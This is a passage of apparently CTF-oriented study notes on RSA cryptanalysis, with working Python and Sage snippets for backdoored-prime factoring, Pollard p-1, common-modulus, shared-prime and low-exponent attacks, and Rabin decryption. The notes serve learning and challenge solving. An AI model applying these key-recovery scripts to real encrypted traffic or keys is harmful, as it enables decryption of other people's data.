<h3 id="backdoor">backdoor</h3>
<blockquote>
<p><a href="https://asecuritysite.com/encryption/copper">https://asecuritysite.com/encryption/copper</a></p>
</blockquote>
<p>$$<br>
Prime = k \times M + 65537^{a} \mod M<br>
$$</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">RSA_Backdoor</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    primes list can produced by primes_first_n() in sagemath</span></span><br><span class="line"><span class="string">    reference:[GKCTF2020]Backdoor</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :param n:modulo</span></span><br><span class="line"><span class="string">    :return:p,q</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    val = <span class="number">39</span> <span class="comment"># edit</span></span><br><span class="line">    M = <span class="number">1</span></span><br><span class="line">    primes = [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">23</span>, <span class="number">29</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">41</span>, <span class="number">43</span>, <span class="number">47</span>, <span class="number">53</span>, <span class="number">59</span>, <span class="number">61</span>, <span class="number">67</span>, <span class="number">71</span>, <span class="number">73</span>, <span class="number">79</span>, <span class="number">83</span>, <span class="number">89</span>, <span class="number">97</span>, <span class="number">101</span>, <span class="number">103</span>,</span><br><span class="line">              <span class="number">107</span>, <span class="number">109</span>, <span class="number">113</span>, <span class="number">127</span>, <span class="number">131</span>, <span class="number">137</span>, <span class="number">139</span>, <span class="number">149</span>, <span class="number">151</span>, <span class="number">157</span>, <span class="number">163</span>, <span class="number">167</span>, <span class="number">173</span>, <span class="number">179</span>, <span class="number">181</span>, <span class="number">191</span>, <span class="number">193</span>, <span class="number">197</span>, <span class="number">199</span>, <span class="number">211</span>, <span class="number">223</span>,</span><br><span class="line">              <span class="number">227</span>, <span class="number">229</span>, <span class="number">233</span>, <span class="number">239</span>, <span class="number">241</span>, <span class="number">251</span>, <span class="number">257</span>, <span class="number">263</span>, <span class="number">269</span>, <span class="number">271</span>, <span class="number">277</span>, <span class="number">281</span>, <span class="number">283</span>, <span class="number">293</span>, <span class="number">307</span>, <span class="number">311</span>, <span class="number">313</span>, <span class="number">317</span>, <span class="number">331</span>, <span class="number">337</span>, <span class="number">347</span>,</span><br><span class="line">              <span class="number">349</span>, <span class="number">353</span>, <span class="number">359</span>, <span class="number">367</span>, <span class="number">373</span>, <span class="number">379</span>, <span class="number">383</span>, <span class="number">389</span>, <span class="number">397</span>, <span class="number">401</span>, <span class="number">409</span>, <span class="number">419</span>, <span class="number">421</span>, <span class="number">431</span>, <span class="number">433</span>, <span class="number">439</span>, <span class="number">443</span>, <span class="number">449</span>, <span class="number">457</span>, <span class="number">461</span>, <span class="number">463</span>,</span><br><span class="line">              <span class="number">467</span>, <span class="number">479</span>, <span class="number">487</span>, <span class="number">491</span>, <span class="number">499</span>, <span class="number">503</span>, <span class="number">509</span>, <span class="number">521</span>, <span class="number">523</span>, <span class="number">541</span>, <span class="number">547</span>, <span class="number">557</span>, <span class="number">563</span>, <span class="number">569</span>, <span class="number">571</span>, <span class="number">577</span>, <span class="number">587</span>, <span class="number">593</span>, <span class="number">599</span>, <span class="number">601</span>, <span class="number">607</span>,</span><br><span class="line">              <span class="number">613</span>, <span class="number">617</span>, <span class="number">619</span>, <span class="number">631</span>, <span class="number">641</span>, <span class="number">643</span>, <span class="number">647</span>, <span class="number">653</span>, <span class="number">659</span>, <span class="number">661</span>, <span class="number">673</span>, <span class="number">677</span>, <span class="number">683</span>, <span class="number">691</span>, <span class="number">701</span>, <span class="number">709</span>, <span class="number">719</span>, <span class="number">727</span>, <span class="number">733</span>, <span class="number">739</span>, <span class="number">743</span>,</span><br><span class="line">              <span class="number">751</span>, <span class="number">757</span>, <span class="number">761</span>, <span class="number">769</span>, <span class="number">773</span>, <span class="number">787</span>, <span class="number">797</span>, <span class="number">809</span>, <span class="number">811</span>, <span class="number">821</span>, <span class="number">823</span>, <span class="number">827</span>, <span class="number">829</span>, <span class="number">839</span>, <span class="number">853</span>, <span class="number">857</span>, <span class="number">859</span>, <span class="number">863</span>, <span class="number">877</span>, <span class="number">881</span>, <span class="number">883</span>,</span><br><span class="line">              <span class="number">887</span>, <span class="number">907</span>, <span class="number">911</span>, <span class="number">919</span>, <span class="number">929</span>, <span class="number">937</span>, <span class="number">941</span>, <span class="number">947</span>, <span class="number">953</span>, <span class="number">967</span>, <span class="number">971</span>, <span class="number">977</span>, <span class="number">983</span>, <span class="number">991</span>, <span class="number">997</span>, <span class="number">1009</span>, <span class="number">1013</span>, <span class="number">1019</span>, <span class="number">1021</span>, <span class="number">1031</span>,</span><br><span class="line">              <span class="number">1033</span>, <span class="number">1039</span>, <span class="number">1049</span>, <span class="number">1051</span>, <span class="number">1061</span>, <span class="number">1063</span>, <span class="number">1069</span>, <span class="number">1087</span>, <span class="number">1091</span>, <span class="number">1093</span>, <span class="number">1097</span>, <span class="number">1103</span>, <span class="number">1109</span>, <span class="number">1117</span>, <span class="number">1123</span>, <span class="number">1129</span>, <span class="number">1151</span>,</span><br><span class="line">              <span class="number">1153</span>, <span class="number">1163</span>, <span class="number">1171</span>, <span class="number">1181</span>, <span class="number">1187</span>, <span class="number">1193</span>, <span class="number">1201</span>, <span class="number">1213</span>, <span class="number">1217</span>, <span class="number">1223</span>, <span class="number">1229</span>, <span class="number">1231</span>, <span class="number">1237</span>, <span class="number">1249</span>, <span class="number">1259</span>, <span class="number">1277</span>, <span class="number">1279</span>,</span><br><span class="line">              <span class="number">1283</span>, <span class="number">1289</span>, <span class="number">1291</span>, <span class="number">1297</span>, <span class="number">1301</span>, <span class="number">1303</span>, <span class="number">1307</span>, <span class="number">1319</span>, <span class="number">1321</span>, <span class="number">1327</span>, <span class="number">1361</span>, <span class="number">1367</span>, <span class="number">1373</span>, <span class="number">1381</span>, <span class="number">1399</span>, <span class="number">1409</span>, <span class="number">1423</span>,</span><br><span class="line">              <span class="number">1427</span>, <span class="number">1429</span>, <span class="number">1433</span>, <span class="number">1439</span>, <span class="number">1447</span>, <span class="number">1451</span>, <span class="number">1453</span>, <span class="number">1459</span>, <span class="number">1471</span>, <span class="number">1481</span>, <span class="number">1483</span>, <span class="number">1487</span>, <span class="number">1489</span>, <span class="number">1493</span>, <span class="number">1499</span>, <span class="number">1511</span>, <span class="number">1523</span>,</span><br><span class="line">              <span class="number">1531</span>, <span class="number">1543</span>, <span class="number">1549</span>, <span class="number">1553</span>, <span class="number">1559</span>, <span class="number">1567</span>, <span class="number">1571</span>, <span class="number">1579</span>, <span class="number">1583</span>, <span class="number">1597</span>, <span class="number">1601</span>, <span class="number">1607</span>, <span class="number">1609</span>, <span class="number">1613</span>, <span class="number">1619</span>, <span class="number">1621</span>, <span class="number">1627</span>,</span><br><span class="line">              <span class="number">1637</span>, <span class="number">1657</span>, <span class="number">1663</span>, <span class="number">1667</span>, <span class="number">1669</span>, <span class="number">1693</span>, <span class="number">1697</span>, <span class="number">1699</span>, <span class="number">1709</span>, <span class="number">1721</span>, <span class="number">1723</span>, <span class="number">1733</span>, <span class="number">1741</span>, <span class="number">1747</span>, <span class="number">1753</span>, <span class="number">1759</span>, <span class="number">1777</span>,</span><br><span class="line">              <span class="number">1783</span>, <span class="number">1787</span>, <span class="number">1789</span>, <span class="number">1801</span>, <span class="number">1811</span>, <span class="number">1823</span>, <span class="number">1831</span>, <span class="number">1847</span>, <span class="number">1861</span>, <span class="number">1867</span>, <span class="number">1871</span>, <span class="number">1873</span>, <span class="number">1877</span>, <span class="number">1879</span>, <span class="number">1889</span>, <span class="number">1901</span>, <span class="number">1907</span>,</span><br><span class="line">              <span class="number">1913</span>, <span class="number">1931</span>, <span class="number">1933</span>, <span class="number">1949</span>, <span class="number">1951</span>, <span class="number">1973</span>, <span class="number">1979</span>, <span class="number">1987</span>, <span class="number">1993</span>, <span class="number">1997</span>, <span class="number">1999</span>, <span class="number">2003</span>, <span class="number">2011</span>, <span class="number">2017</span>, <span class="number">2027</span>, <span class="number">2029</span>, <span class="number">2039</span>,</span><br><span class="line">              <span class="number">2053</span>, <span class="number">2063</span>, <span class="number">2069</span>, <span class="number">2081</span>, <span class="number">2083</span>, <span class="number">2087</span>, <span class="number">2089</span>, <span class="number">2099</span>, <span class="number">2111</span>, <span class="number">2113</span>, <span class="number">2129</span>, <span class="number">2131</span>, <span class="number">2137</span>, <span class="number">2141</span>, <span class="number">2143</span>, <span class="number">2153</span>, <span class="number">2161</span>,</span><br><span class="line">              <span class="number">2179</span>, <span class="number">2203</span>, <span class="number">2207</span>, <span class="number">2213</span>, <span class="number">2221</span>, <span class="number">2237</span>, <span class="number">2239</span>, <span class="number">2243</span>, <span class="number">2251</span>, <span class="number">2267</span>, <span class="number">2269</span>, <span class="number">2273</span>, <span class="number">2281</span>, <span class="number">2287</span>, <span class="number">2293</span>, <span class="number">2297</span>, <span class="number">2309</span>,</span><br><span class="line">              <span class="number">2311</span>, <span class="number">2333</span>, <span class="number">2339</span>, <span class="number">2341</span>, <span class="number">2347</span>, <span class="number">2351</span>, <span class="number">2357</span>, <span class="number">2371</span>, <span class="number">2377</span>, <span class="number">2381</span>, <span class="number">2383</span>, <span class="number">2389</span>, <span class="number">2393</span>, <span class="number">2399</span>, <span class="number">2411</span>, <span class="number">2417</span>, <span class="number">2423</span>,</span><br><span class="line">              <span class="number">2437</span>, <span class="number">2441</span>, <span class="number">2447</span>, <span class="number">2459</span>, <span class="number">2467</span>, <span class="number">2473</span>, <span class="number">2477</span>, <span class="number">2503</span>, <span class="number">2521</span>, <span class="number">2531</span>, <span class="number">2539</span>, <span class="number">2543</span>, <span class="number">2549</span>, <span class="number">2551</span>, <span class="number">2557</span>, <span class="number">2579</span>, <span class="number">2591</span>,</span><br><span class="line">              <span class="number">2593</span>, <span class="number">2609</span>, <span class="number">2617</span>, <span class="number">2621</span>, <span class="number">2633</span>, <span class="number">2647</span>, <span class="number">2657</span>, <span class="number">2659</span>, <span class="number">2663</span>, <span class="number">2671</span>, <span class="number">2677</span>, <span class="number">2683</span>, <span class="number">2687</span>, <span class="number">2689</span>, <span class="number">2693</span>, <span class="number">2699</span>, <span class="number">2707</span>,</span><br><span class="line">              <span class="number">2711</span>, <span class="number">2713</span>, <span class="number">2719</span>, <span class="number">2729</span>, <span class="number">2731</span>, <span class="number">2741</span>, <span class="number">2749</span>, <span class="number">2753</span>, <span class="number">2767</span>, <span class="number">2777</span>, <span class="number">2789</span>, <span class="number">2791</span>, <span class="number">2797</span>, <span class="number">2801</span>, <span class="number">2803</span>, <span class="number">2819</span>, <span class="number">2833</span>,</span><br><span class="line">              <span class="number">2837</span>, <span class="number">2843</span>, <span class="number">2851</span>, <span class="number">2857</span>, <span class="number">2861</span>, <span class="number">2879</span>, <span class="number">2887</span>, <span class="number">2897</span>, <span class="number">2903</span>, <span class="number">2909</span>, <span class="number">2917</span>, <span class="number">2927</span>, <span class="number">2939</span>, <span class="number">2953</span>, <span class="number">2957</span>, <span class="number">2963</span>, <span class="number">2969</span>,</span><br><span class="line">              <span class="number">2971</span>, <span class="number">2999</span>]</span><br><span class="line">    <span class="comment"># print(primes)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, val):</span><br><span class="line">        M = M * primes[i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">            p = gmpy2.mpz(k * M + (<span class="built_in">pow</span>(<span class="number">65537</span>, a, M)))</span><br><span class="line">            <span class="keyword">if</span> gmpy2.is_prime(p):</span><br><span class="line">                q = gmpy2.mpz(n // p)</span><br><span class="line">                <span class="keyword">if</span> gmpy2.is_prime(q):</span><br><span class="line">                    <span class="keyword">return</span> p, q</span><br><span class="line">                    <span class="comment"># print(q)</span></span><br></pre></td></tr></table></figure>
<h3 id="xor-factorization">xor factorization</h3>
<blockquote>
<p><a href="https://github.com/sliedes/xor_factor">GitHub - sliedes/xor_factor: Given p xor q and n=p*q for two unknown primes p and q, factor n and output p and q.</a></p>
</blockquote>
<p><strong>usage</strong></p>
<p><code>xor_factor.py n x</code></p>
<h3 id="pollard’s-p-1">pollard’s p-1</h3>
<blockquote>
<p>This part only give the solution.</p>
<p>Detailed introduction needs time to be written.</p>
</blockquote>
<p>$$<br>
(p-1) | B!\<br>
$$</p>
<p>$$<br>
2^{B!}\equiv 1 \mod p<br>
$$</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> primefac <span class="keyword">import</span> pollard_pm1</span><br><span class="line">p = pollard_pm1(n)</span><br><span class="line"><span class="comment"># May it cost a lot of time, just wait. </span></span><br></pre></td></tr></table></figure>
<h3 id="williams’s-p-1">williams’s p+1</h3>
<blockquote>
<p>As above.</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> primefac <span class="keyword">import</span> williams_pp1</span><br><span class="line">p = williams_pp1(n)</span><br><span class="line"><span class="comment"># Similar to Pollard&#x27;s p-1</span></span><br></pre></td></tr></table></figure>
<h3 id="known-phi">known phi</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> isqrt</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> is_prime</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">factorize</span>(<span class="params">N, phi</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Recovers the prime factors from a modulus if Euler&#x27;s totient is known.</span></span><br><span class="line"><span class="string">    This method only works for a modulus consisting of 2 primes!</span></span><br><span class="line"><span class="string">    :param N: the modulus</span></span><br><span class="line"><span class="string">    :param phi: Euler&#x27;s totient, the order of the multiplicative group modulo N</span></span><br><span class="line"><span class="string">    :return: a tuple containing the prime factors, or None if the factors were not found</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    s = N + <span class="number">1</span> - phi</span><br><span class="line">    d = s ** <span class="number">2</span> - <span class="number">4</span> * N</span><br><span class="line">    p = <span class="built_in">int</span>(s - isqrt(d)) // <span class="number">2</span></span><br><span class="line">    q = <span class="built_in">int</span>(s + isqrt(d)) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> p, q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">factorize_multi_prime</span>(<span class="params">N, phi</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Recovers the prime factors from a modulus if Euler&#x27;s totient is known.</span></span><br><span class="line"><span class="string">    This method works for a modulus consisting of any number of primes, but is considerably be slower than factorize.</span></span><br><span class="line"><span class="string">    More information: Hinek M. J., Low M. K., Teske E., &quot;On Some Attacks on Multi-prime RSA&quot; (Section 3)</span></span><br><span class="line"><span class="string">    :param N: the modulus</span></span><br><span class="line"><span class="string">    :param phi: Euler&#x27;s totient, the order of the multiplicative group modulo N</span></span><br><span class="line"><span class="string">    :return: a tuple containing the prime factors</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    prime_factors = <span class="built_in">set</span>()</span><br><span class="line">    factors = [N]</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(factors) &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># Element to factorize.</span></span><br><span class="line">        N = factors[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        w = randrange(<span class="number">2</span>, N - <span class="number">1</span>)</span><br><span class="line">        i = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> phi % (<span class="number">2</span> ** i) == <span class="number">0</span>:</span><br><span class="line">            sqrt_1 = <span class="built_in">pow</span>(w, phi // (<span class="number">2</span> ** i), N)</span><br><span class="line">            <span class="keyword">if</span> sqrt_1 &gt; <span class="number">1</span> <span class="keyword">and</span> sqrt_1 != N - <span class="number">1</span>:</span><br><span class="line">                <span class="comment"># We can remove the element to factorize now, because we have a factorization.</span></span><br><span class="line">                factors = factors[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">                p = gcd(N, sqrt_1 + <span class="number">1</span>)</span><br><span class="line">                q = N // p</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> is_prime(p):</span><br><span class="line">                    prime_factors.add(p)</span><br><span class="line">                <span class="keyword">elif</span> p &gt; <span class="number">1</span>:</span><br><span class="line">                    factors.append(p)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> is_prime(q):</span><br><span class="line">                    prime_factors.add(q)</span><br><span class="line">                <span class="keyword">elif</span> q &gt; <span class="number">1</span>:</span><br><span class="line">                    factors.append(q)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># Continue in the outer loop</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">tuple</span>(prime_factors)</span><br></pre></td></tr></table></figure>
<h2 id="sage">sage</h2>
<h3 id="n-a-2-b-2">$n = a^2 + b^2$</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">two_squares(n)</span><br></pre></td></tr></table></figure>
<h3 id="n-a-2-b-2-c-2">$n = a^2 + b^2 + c^2$</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">three_squares(n)</span><br></pre></td></tr></table></figure>
<h3 id="Quadratic-Sieve">Quadratic Sieve</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">qsieve()</span><br></pre></td></tr></table></figure>
<h3 id="find-prime-factors">find prime factors</h3>
<ul>
<li>elliptic curve factorize</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ecm()</span><br></pre></td></tr></table></figure>
<ul>
<li>just prime factorize</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">prime_divisors()</span><br></pre></td></tr></table></figure>
<h2 id="Others">Others</h2>
<blockquote>
<p><a href="http://mathmu.github.io/MTCAS/doc/IntegerFactorization.html">整数因子分解 - maTHμ - 计算机代数系统 (mathmu.github.io)</a></p>
</blockquote>
<ul>
<li>lenstra elliptic curve factorization</li>
<li>birthday attack</li>
<li>……</li>
</ul>
<h1>SAME MOD</h1>
<p>The attack is based on the <strong>Homomorphic Encryption</strong> and <strong>Extended Euclidean Algorithm</strong>.</p>
<blockquote>
<p>Usually, we have two pairs of $c$ and $e$ and both them have the same modulo.</p>
<p>*REMEMBER that the encrypted m should be same. *</p>
</blockquote>
<p>$$<br>
c_{1} \equiv m^{e_{1}} \mod n\<br>
$$</p>
<p>$$<br>
c_{2} \equiv m^{e_{2}} \mod n<br>
$$</p>
<p>Use Extended Euclidean Algorithm, the eqution follows:<br>
$$<br>
r \times e_{1} + s \times e_{2} = gcd(e1, e2)<br>
$$<br>
Based on the <code>Multiplicative homomorphism</code>, and we can make a conversion.</p>
<p>$$<br>
c_{1}^{s} \times c_{2}^{r} \equiv m^{r\times e_{1} + s\times e_{2}} \mod n<br>
$$</p>
<h2 id="e-1-e-2-are-primes">$e_{1}$, $e_{2}$ are primes</h2>
<p>If $e_{1}$ and $e_{2}$ are primes, $gcd(e_{1}, e_{2}) = 1$, and we can substitute the integer into the equation above.<br>
$$<br>
c_{1}^{s} \times c_{2}^{r} \equiv m \mod n<br>
$$</p>
<h2 id="e-1-e-2-not-primes">$e_{1}$, $e_{2}$ not primes</h2>
<ol>
<li>$gcd(e1, e2)$ and $\varphi(n)$ are not relatively-prime.</li>
</ol>
<p>May use <code>Rabin Algorithm</code> to solve this problem. For another word, the problem converts to the <code>Low_Exponent_e2</code> problem.</p>
<ol start="2">
<li>$gcd(e1, e2)$ and $\varphi(n)$ are relatively-prime.</li>
</ol>
<p>Thus,  just use <code>iroot(m, g)</code> and we get the true $m$. <strong>REMEMBER</strong> that before the calculation we ought to <code> % n</code> first.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Same_Mod_RSA</span>(<span class="params">e1, e2, c1, c2, n</span>):</span><br><span class="line">    g, r, s = gmpy2.gcdext(e1, e2)</span><br><span class="line">    <span class="keyword">if</span> r &lt; <span class="number">0</span>:</span><br><span class="line">        r = -r</span><br><span class="line">        c1 = gmpy2.invert(c1, n)</span><br><span class="line">    <span class="keyword">elif</span> s &lt; <span class="number">0</span>:</span><br><span class="line">        s = -s</span><br><span class="line">        c2 = gmpy2.invert(c2, n)</span><br><span class="line">    m = gmpy2.powmod(c1, r, n)*gmpy2.powmod(c2, s, n) % n <span class="comment"># keypoint</span></span><br><span class="line">    <span class="keyword">if</span> g == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> m</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> gmpy2.iroot(m, g)[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>
<p><em>The code ignores that gcd($e_{1}$, $e_{2}$) and $\varphi(n)$ are not relatively-prime</em>.</p>
<h2 id="Multiplicative-congruence">Multiplicative congruence</h2>
<p>We use multiplicative congruence to simplify our calculation.</p>
<p>It usually gives us one same modulo $n$ and two more pairs of $c$, $e$.</p>
<p><strong>FOR EXAMPLE</strong>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">N = </span><br><span class="line">c1 = </span><br><span class="line">e1 = </span><br><span class="line">c2 = </span><br><span class="line">e2 = </span><br><span class="line">c3 = </span><br><span class="line">e3 = </span><br></pre></td></tr></table></figure>
<p>The deduction is as follows:<br>
$$<br>
g_{1} \equiv e_{1} \cdot r_{1} + e_{2} \cdot s_{1} \<br>
$$<br>
$$<br>
g_{2} \equiv g_{1} \cdot r_{2} + e_{3} \cdot s_{2}<br>
$$</p>
<p>The three public keys satisfy $gcd(e_{1}, e_{2}, e_{3}) = 1$, so $g_{2} = 1$.</p>
<p>We can get the equation that $1\equiv (e_{1}\cdot r_{1} + e_{2} \cdot s_{1})\cdot r_{2} + e_{3} \cdot s_{2}$.</p>
<p>Expand it:<br>
$$<br>
1 \equiv (r_2\cdot r_1)\cdot e_1 + (s_1 \cdot r_2)\cdot e_2 + s_2\cdot e_3<br>
$$</p>
<p>$$<br>
c_1 \equiv m^{e_1} \mod n<br>
$$</p>
<p>$$<br>
c_2 \equiv m^{e_2} \mod n \<br>
$$</p>
<p>$$<br>
c_3 \equiv m^{e_3} \mod n \<br>
$$</p>
<p>$$<br>
\Longrightarrow c_1^{r_2\cdot r_1}\cdot c_2^{s_1\cdot r_2} \cdot c_3^{s_2} \equiv m \mod n<br>
$$</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">g1, r1, s1 = gcdext(e1, e2)</span><br><span class="line">g2, r2, s2 = gcdext(g1, e3)</span><br><span class="line"><span class="comment"># print(g2)</span></span><br><span class="line">m = powmod(c1, r2*r1, n)*powmod(c2, s1*r2, n)*powmod(c3, s2, n) % n <span class="comment"># keypoint</span></span><br></pre></td></tr></table></figure>
<h1>MODULO RELATED</h1>
<blockquote>
<p>$n_{1}$ and $n_{2}$ are relatively-primes</p>
<p>When they encrypt the same message $m$，it exists <strong>THE MODULO RELATED ATTACK</strong>.</p>
</blockquote>
<p><strong>Deduction</strong><br>
$$<br>
n_1 = p \times q_1<br>
$$</p>
<p>$$<br>
n_2 = p \times q_2\<br>
$$</p>
<p><em>Ignore the possibility that $1 \times n_1$ and $1 \times n_2$</em><br>
$$<br>
p = gcd(n_1, n_2) \<br>
$$</p>
<p>$$<br>
q_1 = n_1 // p<br>
$$</p>
<p>$$<br>
q_2 = n_2 // p<br>
$$</p>
<p>$ p$ can be calculated with function <code>gcd()</code> , and  use division to solve out the $q_1$ and $q_2$.</p>
<p>The problem converts to the <code>Original_RSA</code>.</p>
<p><strong>Solution</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">RSA_NPM</span>(<span class="params">n1,n2,e,c1</span>):</span><br><span class="line">    p = gmpy2.gcd(n1,n2)</span><br><span class="line">    q1 = n1//p  <span class="comment"># keypoint</span></span><br><span class="line">    N = (p-<span class="number">1</span>)*(q1-<span class="number">1</span>)</span><br><span class="line">    d = gmpy2.invert(e,<span class="built_in">int</span>(N))</span><br><span class="line">    m = gmpy2.powmod(c1,d,n1)</span><br><span class="line">    <span class="keyword">return</span> m</span><br></pre></td></tr></table></figure>
<p><em>Remember that $n_1$ and $c_1$ are one-to-one!</em></p>
<h1>LOW EXPONENT</h1>
<h2 id="e-3">e = 3</h2>
<blockquote>
<p>or one-to-one function</p>
</blockquote>
<p>JUST Bruck.</p>
<ol>
<li>$m^e &lt; n$, means that $k = 0$ in code below</li>
<li>$m^e &gt; n$</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">RSA_Low_Exponent_e3</span>(<span class="params">c,e,n</span>):</span><br><span class="line">    k = <span class="number">0</span> <span class="comment"># one</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>: <span class="comment"># the other</span></span><br><span class="line">        cm = c + n*k</span><br><span class="line">        m, index = gmpy2.iroot(cm, e)</span><br><span class="line">        <span class="keyword">if</span> index == <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">return</span> m</span><br><span class="line">        k += <span class="number">1</span></span><br></pre></td></tr></table></figure>
<h2 id="e-and-varphi-n-are-not-relatively-prime">$e$ and $\varphi(n)$ are not relatively-prime</h2>
<h3 id="e-2">e = 2</h3>
<blockquote>
<p>Rabin</p>
</blockquote>
<p><strong>PART1</strong> $m_p$ and $m_q$</p>
<p>Split into two scenarios for discussion:</p>
<ol>
<li>$p$ and $q$ are satisfied $p \equiv q \equiv 3 \mod 4$.</li>
</ol>
<p>$$<br>
m_p \equiv c^{\frac{1}{4}(p + 1)} \mod p<br>
$$</p>
<p>$$<br>
m_q \equiv c^{\frac{1}{4}(q + 1)} \mod q<br>
$$</p>
<ol start="2">
<li>$p$ and $q$ are different to 1.</li>
</ol>
<p>$$<br>
m_p \equiv c^{\frac{1}{2}} \mod p<br>
$$</p>
<p>$$<br>
m_q \equiv c^{\frac{1}{2}} \mod q<br>
$$</p>
<p><strong>PART2</strong> Calculated $y_p$ and $y_q$ with Extended Euclidean Algorithm whose function is <code>gmpy2.gcdext()</code>.<br>
$$<br>
y_p \cdot p + y_q \cdot q = 1<br>
$$<br>
<strong>PART3</strong> Solve out four plaintexts.<br>
$$<br>
a \equiv (y_p \cdot p \cdot m_q + y_q \cdot q \cdot m_p) \mod n<br>
$$</p>
<p>$$<br>
b \equiv n - a<br>
$$</p>
<p>$$<br>
c \equiv (y_p \cdot p \cdot m_q - y_q \cdot q \cdot m_p) \mod n<br>
$$</p>
<p>$$<br>
d \equiv n - c<br>
$$</p>
<p>Thus, we will get four different plaintext, and one of them is the true plaintext.</p>
<p>Here is the complete code:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">RSA_Rabin_e2</span>(<span class="params">c,n,p,q</span>):</span><br><span class="line">    mp = gmpy2.powmod(c,(p+<span class="number">1</span>)//<span class="number">4</span>,p)</span><br><span class="line">    mq = gmpy2.powmod(c,(q+<span class="number">1</span>)//<span class="number">4</span>,q)</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mp = gmpy2.powmod(c,1/2,p)</span></span><br><span class="line"><span class="string">    mq = gmpy2.powmod(c,1/2,q)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    gcd,yp,yq = gmpy2.gcdext(p,q)</span><br><span class="line"></span><br><span class="line">    m1 = (yp * p * mq + yq * q * mp) % n</span><br><span class="line">    m2 = n - m1</span><br><span class="line">    m3 = (yp * p * mq - yq * q * mp) % n</span><br><span class="line">    m4 = n - m3</span><br><span class="line">    <span class="keyword">return</span> m1, m2, m3, m4</span><br></pre></td></tr></table></figure>
<h3 id="e-2-2">e != 2</h3>
<p>If $e$ is not equal to 2, we use another way to calculate the final $m$.</p>
<p>For example, $gcd(e, \varphi(n)) = a$. We can divide $e$ to get the equation $gcd(e//a, \varphi(n)) = 1$ to solve the private key $d$.</p>
<p>Finally, we get the $m^{a}$. We use <code>iroot($m^&#123;a&#125;$, a)[0]</code> to get the final plaintext $m$.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># We define phi as N</span></span><br><span class="line">a = gcd(e, N)</span><br><span class="line">d = invert(e//a, N)</span><br><span class="line">m = iroot(powmod(c, d, n), a)[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>
<h3 id="AMM">AMM</h3>
<blockquote>
<p>The same $e$ is too large to solve out.</p>
</blockquote>
